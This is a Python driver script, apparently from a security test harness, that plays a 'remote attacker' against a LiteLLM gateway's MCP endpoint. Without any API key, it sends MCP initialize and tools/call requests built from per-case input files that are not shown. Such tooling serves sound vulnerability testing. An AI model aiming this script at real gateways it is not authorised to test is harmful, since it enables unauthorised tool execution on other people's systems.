"""Remote attacker against the LiteLLM gateway's MCP endpoint (stdlib HTTP, MCP streamable-HTTP
JSON-RPC). inputs/<arm>.json gives the URL path, the request headers the attacker sends (no
LiteLLM key in either arm) and the tool call. Usage: driver.py <arm> <nonce> <host|base-url>.
"""
import json
import sys
import urllib.error
import urllib.request

arm, nonce, base = sys.argv[1], sys.argv[2], sys.argv[3]
spec = json.loads(open(f"/case/inputs/{arm}.json", encoding="utf-8").read().replace("{{NONCE}}", nonce))
if not base.startswith("http"):
    base = f"http://{base}:4000"
url = base.rstrip("/") + spec["path"]
session = None


def rpc(obj):
    global session
    h = {"Content-Type": "application/json", "Accept": "application/json, text/event-stream",
         "MCP-Protocol-Version": "2025-06-18", **spec["headers"]}
    if session:
        h["Mcp-Session-Id"] = session
    req = urllib.request.Request(url, data=json.dumps(obj).encode(), headers=h, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            session = r.headers.get("Mcp-Session-Id") or session
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


st, body = rpc({"jsonrpc": "2.0", "id": 1, "method": "initialize",
                "params": {"protocolVersion": "2025-06-18", "capabilities": {},
                           "clientInfo": {"name": "avb-attacker", "version": "0"}}})
print("initialize", st, body[:150])
if st == 200:
    rpc({"jsonrpc": "2.0", "method": "notifications/initialized"})
    st, body = rpc({"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": spec["call"]})
    print("tools/call", st, body[:250])
